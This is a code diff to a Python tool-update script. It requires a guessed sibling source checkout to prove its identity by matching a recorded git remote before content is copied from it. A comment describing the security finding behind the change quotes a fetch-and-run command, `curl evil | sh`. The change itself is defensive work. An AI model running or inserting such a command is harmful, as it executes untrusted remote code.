@@ -37,6 +37,7 @@ import hashlib
 import json
 import os
 import shutil
+import subprocess
 import sys
 from pathlib import Path
 
@@ -71,7 +72,7 @@ def save(data):
     os.replace(tmp, MANIFEST)
 
 
-def resolve_source(recorded):
+def resolve_source(recorded, source_remote=None):
     """The manifest records an ABSOLUTE source path, which broke every cloned repo:
     on a machine without that exact path, nothing could update — and third-party
     adoption is impossible if a checkout only works where it was first installed
@@ -87,19 +88,38 @@ def resolve_source(recorded):
     Returns (path or None, note). The note says when a fallback was used, because a
     silently substituted source is how the wrong checkout feeds an update."""
     recorded = Path(recorded) if recorded else None
-    candidates = []
-    if recorded:
-        candidates.append((recorded, ""))
+    if recorded and (recorded / "tools").is_dir():
+        return recorded, ""            # the recorded path exists — same machine, trusted
     env = os.environ.get("ASTRA_SOURCE")
-    if env:
-        candidates.append((Path(env), "via $ASTRA_SOURCE"))
-    if recorded and recorded.name:
-        candidates.append((REPO.parent / recorded.name, "sibling of this repo's parent"))
-    for cand, how in candidates:
-        if (cand / "tools").is_dir():
-            note = f" (resolved {how}: {cand})" if how else ""
-            return cand, note
+    if env and (Path(env) / "tools").is_dir():
+        return Path(env), " (resolved via $ASTRA_SOURCE)"   # operator-set, trusted
+    # A SIBLING is GUESSED from a basename, so it must PROVE it is the same project
+    # before it may feed content. A stray checkout, fork, or unpacked tarball that
+    # merely shares the directory name is otherwise an arbitrary-content injection
+    # (adversarial round, SEVERE: a sibling containing `curl evil | sh` was copied in
+    # and run, exit 0). The recorded source path is DEAD in this branch by construction
+    # (that is why we are guessing), so the identity anchor is the source's git-remote
+    # URL recorded in the manifest at install time — the sibling must be the SAME
+    # repository, and a manifest that never recorded one gets no sibling fallback.
+    if recorded and recorded.name and source_remote:
+        sib = REPO.parent / recorded.name
+        if (sib / "tools").is_dir() and _git_remote(sib) == source_remote:
+            return sib, f" (verified sibling: its git remote matches the recorded source {source_remote})"
     return None, ""
+
+
+def _git_remote(path):
+    # Catch only the ways git-the-subprocess can legitimately fail (not installed,
+    # hung). A broad `except Exception` here once swallowed a NameError from a missing
+    # `import subprocess` and returned None for EVERY sibling — the whole verified-
+    # sibling feature was silently dead and the impostor test passed by accident. A
+    # programming error must surface, not read as "no remote".
+    try:
+        r = subprocess.run(["git", "-C", str(path), "remote", "get-url", "origin"],
+                           capture_output=True, text=True, timeout=10)
+    except (OSError, subprocess.SubprocessError):
+        return None
+    return r.stdout.strip() if r.returncode == 0 and r.stdout.strip() else None
 
 
 def main():
@@ -108,7 +128,8 @@ def main():
     behind = modified = current = missing = 0
 
     for tool, meta in sorted(data.get("tools", {}).items()):
-        src_root, src_note = resolve_source(meta.get("source", ""))
+        src_root, src_note = resolve_source(meta.get("source", ""),
+                                            meta.get("source_remote"))
         if src_root is None:
             print(f"  SOURCE GONE  {tool}  (recorded {meta.get('source')!r}; no "
                   f"$ASTRA_SOURCE, no sibling clone). Set ASTRA_SOURCE=<path to the "
